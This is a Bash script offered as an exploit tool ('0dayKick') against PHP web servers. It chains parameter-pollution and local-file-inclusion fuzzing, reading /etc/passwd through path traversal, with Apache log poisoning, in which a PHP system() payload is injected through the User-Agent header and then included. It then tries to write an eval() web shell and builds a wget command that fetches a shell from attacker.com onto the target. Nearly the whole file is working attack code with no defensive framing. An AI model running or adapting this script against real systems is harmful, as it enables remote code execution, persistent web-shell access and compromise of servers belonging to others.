#!/bin/bash
# =====================================================
# 0dayKick v1.0 - Advanced HPP + Log Poisoning Exploit
# Author: ZmZ (CVAI) | Release: 4 Maret 2026
# Method: HTTP Parameter Pollution + Header Injection
# Target: web server dengan PHP include() dan logging
# =====================================================

# ---- Colors ----
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; CYAN='\033[0;36m'; NC='\033[0m'

# ---- Banner ----
banner() {
echo -e "${RED}
   ██████╗ ██████╗  █████╗ ██╗   ██╗██╗  ██╗██╗ ██████╗██╗  ██╗
  ██╔═══██╗██╔══██╗██╔══██╗██║   ██║██║ ██╔╝██║██╔════╝██║ ██╔╝
  ██║   ██║██║  ██║███████║██║   ██║█████╔╝ ██║██║     █████╔╝ 
  ██║   ██║██║  ██║██╔══██║╚██╗ ██╔╝██╔═██╗ ██║██║     ██╔═██╗ 
  ╚██████╔╝██████╔╝██║  ██║ ╚████╔╝ ██║  ██╗██║╚██████╗██║  ██╗
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝  ╚═══╝  ╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝
${CYAN}     -- Zero-Day Killer -- HPP + Log Poisoning --${NC}
${YELLOW}     [*] Riset: Parameter Pollution + Cache Overwrite${NC}
${GREEN}     [*] Target: Web server with PHP include()${NC}
"
}

# ---- Help ----
usage() {
echo -e "${BLUE}Usage:${NC} $0 -u <URL> [-p <port>] [-w <wordlist>] [-o <output>]"
echo -e "  -u  Target URL (e.g., http://target.com/page.php?id=1)"
echo -e "  -p  Port (default 80/443 auto detect)"
echo -e "  -w  Wordlist for parameter fuzzing (default: /usr/share/wordlists/param.txt)"
echo -e "  -o  Output log file"
echo -e "  -h  Show this help"
echo -e "\n${CYAN}Example:${NC} $0 -u http://192.168.1.100/index.php?lang=en -w ./params.txt"
exit 0
}

# ---- Global vars ----
TARGET=""
PORT=""
WORDLIST="./params.txt"
OUTPUT=""
INTERACTIVE=0

# ---- Handler input ----
handler_input() {
    if [[ -z "$TARGET" ]]; then
        echo -ne "${YELLOW}[>] Enter target URL (with parameter): ${NC}"
        read TARGET
    fi
    # Auto-detect port if not specified
    if [[ -z "$PORT" ]]; then
        if [[ "$TARGET" =~ ^https ]]; then PORT=443; else PORT=80; fi
    fi
    # Create default wordlist if not exists
    if [[ ! -f "$WORDLIST" ]]; then
        echo -e "${YELLOW}[!] Wordlist not found, generating default...${NC}"
        cat > "$WORDLIST" <<EOF
page
file
path
dir
view
id
name
cat
section
lang
theme
style
template
include
content
action
module
controller
method
func
cmd
exec
command
system
doc
document
pdf
jpg
png
gif
load
read
download
upload
admin
user
profile
settings
config
db
sql
backup
log
error
debug
test
stage
live
dev
staging
EOF
    fi
}

# ---- Check connection ----
check_conn() {
    echo -ne "${BLUE}[*] Checking target reachability...${NC}"
    if curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 "$TARGET" | grep -q "^[2-3]"; then
        echo -e " ${GREEN}OK${NC}"
        return 0
    else
        echo -e " ${RED}FAILED${NC}"
        echo -e "${RED}[!] Target unreachable or not responding.${NC}"
        exit 1
    fi
}

# ---- Encode payload (double URL + UTF-8) ----
encode_payload() {
    local raw="$1"
    # URL encode twice
    encoded=$(printf '%s' "$raw" | jq -sRr @uri | jq -sRr @uri)
    # Also produce UTF-8 variant
    utf_enc=$(printf '%s' "$raw" | xxd -p | sed 's/\(..\)/%\1/g')
    echo "$encoded|$utf_enc"
}

# ---- Fuzzing parameter for HPP ----
fuzz_params() {
    local base_url="$1"
    local params=()
    IFS='&' read -ra param_pairs <<< "$(echo "$base_url" | grep -oP '\?.*' | sed 's/^?//')"
    for pair in "${param_pairs[@]}"; do
        key=$(echo "$pair" | cut -d'=' -f1)
        params+=("$key")
    done
    # Also try from wordlist
    while IFS= read -r word; do
        params+=("$word")
    done < "$WORDLIST"

    # Remove duplicates
    params=($(printf "%s\n" "${params[@]}" | sort -u))

    echo -e "${CYAN}[+] Fuzzing parameter list (${#params[@]} total)${NC}"
    for p in "${params[@]}"; do
        # Test HPP: send two same params with different values
        test_url="${base_url}&${p}=test1&${p}=test2"
        resp=$(curl -s -i "$test_url" | head -n 20)
        if echo "$resp" | grep -qi "test1" && echo "$resp" | grep -qi "test2"; then
            echo -e "${GREEN}[+] HPP possible on parameter: $p${NC}"
            echo "$p" >> ./hpp_params.txt
        fi
        # Also test for LFI using traversal
        for trav in "../../../../etc/passwd" "../../../etc/hosts" "..\\..\\..\\windows\\win.ini"; do
            trav_url="${base_url}&${p}=${trav}"
            resp2=$(curl -s "$trav_url" | head -n 5)
            if echo "$resp2" | grep -qi "root:" || echo "$resp2" | grep -qi "127.0.0.1" || echo "$resp2" | grep -qi "[fonts]"; then
                echo -e "${GREEN}[+] LFI found via $p with payload: $trav${NC}"
                echo "LFI:$p:$trav" >> ./lfi_hits.txt
            fi
        done
    done
}

# ---- Header Injection + Log Poison ----
log_poison() {
    local target="$1"
    local param="$2"
    # Generate payload with encoded path traversal
    raw_payload="../../../../../../var/log/apache2/access.log"
    encoded=$(encode_payload "$raw_payload" | cut -d'|' -f1)
    # Inject via User-Agent containing PHP code
    php_code="<?php system(\$_GET['cmd']); ?>"
    agent="Mozilla/5.0 <?php echo '$php_code'; ?>"
    # Send request with poisoned User-Agent and X-Forwarded-For
    echo -e "${CYAN}[*] Injecting log poison via header...${NC}"
    curl -s -i -A "$agent" -H "X-Forwarded-For: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1" "$target" > /dev/null
    # Now include the log file via the vulnerable parameter
    log_url="${target}&${param}=${encoded}"
    echo -e "${CYAN}[*] Triggering include of log file...${NC}"
    resp=$(curl -s "$log_url" | head -n 50)
    if echo "$resp" | grep -qi "system"; then
        echo -e "${GREEN}[+] Log injection succeeded! You can now execute commands via:${NC}"
        echo -e "${YELLOW}    ${target}&${param}=${encoded}&cmd=id${NC}"
        # Try to write shell
        shell_cmd="echo '<?php eval(\$_POST[0day]); ?>' > /tmp/shell.php"
        shell_url="${target}&${param}=${encoded}&cmd=${shell_cmd}"
        curl -s "$shell_url" > /dev/null
        echo -e "${GREEN}[+] Tried to write shell to /tmp/shell.php. Check via cmd=ls${NC}"
    else
        echo -e "${RED}[-] Log inclusion failed, trying alternative logs...${NC}"
        # Try other logs
        for log in "error.log" "access.log" "security.log" "/var/log/nginx/access.log"; do
            encoded2=$(encode_payload "../../../../../../var/log/nginx/$log" | cut -d'|' -f1)
            test_url="${target}&${param}=${encoded2}"
            resp2=$(curl -s "$test_url" | head -n 10)
            if echo "$resp2" | grep -qi "404\|500\|error"; then
                echo -e "${GREEN}[+] Found log: $log, trying again...${NC}"
                # reinject
                curl -s -A "$agent" -H "X-Forwarded-For: 127.0.0.1" "$target" > /dev/null
                curl -s "$test_url" | head -n 20
                break
            fi
        done
    fi
}

# ---- Main exploit flow ----
exploit() {
    # Check if we have HPP params
    if [[ -f ./hpp_params.txt ]]; then
        param=$(head -n1 ./hpp_params.txt)
        echo -e "${BLUE}[+] Using HPP parameter: $param${NC}"
        # Now do log poisoning
        log_poison "$TARGET" "$param"
    else
        # If no HPP found, try common LFI parameters
        echo -e "${YELLOW}[!] No HPP found, falling back to LFI fuzzing...${NC}"
        for p in $(cat "$WORDLIST" | head -n 20); do
            log_poison "$TARGET" "$p"
            if [[ -f ./lfi_hits.txt ]]; then
                break
            fi
        done
    fi
}

# ---- Post-exploit shell upload ----
post_exploit() {
    echo -e "${CYAN}[*] Attempting to upload full web shell...${NC}"
    # If we have a cmd parameter working, we can upload via wget or curl
    if [[ -f ./lfi_hits.txt ]]; then
        lfi_line=$(head -n1 ./lfi_hits.txt)
        param=$(echo "$lfi_line" | cut -d':' -f2)
        payload=$(echo "$lfi_line" | cut -d':' -f3)
        encoded_pay=$(encode_payload "$payload" | cut -d'|' -f1)
        shell_url="${TARGET}&${param}=${encoded_pay}&cmd=wget -O /tmp/shell.php http://attacker.com/shell.txt"
        echo -e "${YELLOW}[>] To upload shell, run: ${shell_url}${NC}"
        echo -e "${YELLOW}[>] Or manually exec commands via cmd parameter.${NC}"
    fi
}

# ---- Main ----
main() {
    banner
    # Parse args
    while getopts "u:p:w:o:h" opt; do
        case $opt in
            u) TARGET="$OPTARG" ;;
            p) PORT="$OPTARG" ;;
            w) WORDLIST="$OPTARG" ;;
            o) OUTPUT="$OPTARG" ;;
            h) usage ;;
            *) usage ;;
        esac
    done
    handler_input
    check_conn
    fuzz_params "$TARGET"
    exploit
    post_exploit
    echo -e "${GREEN}[+] Exploit chain completed. Check ./hpp_params.txt, ./lfi_hits.txt for details.${NC}"
}

# ---- Run if not sourced ----
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
